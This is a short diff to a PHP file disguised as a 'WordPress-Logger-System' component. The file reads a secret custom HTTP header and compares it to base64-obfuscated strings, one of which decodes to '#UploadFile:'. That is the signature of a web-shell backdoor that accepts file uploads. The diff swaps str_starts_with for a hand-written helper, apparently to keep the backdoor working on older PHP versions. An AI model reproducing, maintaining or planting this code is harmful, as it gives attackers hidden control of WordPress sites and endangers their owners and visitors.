@@ -15,6 +15,10 @@
 
     $SSW = $NuNes("I1VwbG9hZEZpbGU6");
 
+    function LoggerStartsWith($haystack, $needle) {
+        return (strpos($haystack, $needle) === 0);
+    }
+
     header("WordPress-Logger-System: Ver.0.1 - Welcome :)");
     $Logger = $_SERVER["HTTP_WORDPRESS_LOGGER_SYSTEM"];
 
@@ -26,7 +30,7 @@
       
         echo $NuNes("PC9zY3JpcHQ+DQo8L2JvZHk+DQo8L2h0bWw+");
 
-    }else if (str_starts_with($Logger, $SSW)) {
+    }else if (LoggerStartsWith($Logger, $SSW)) {
       
         echo $NuNes("IyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMj");
       
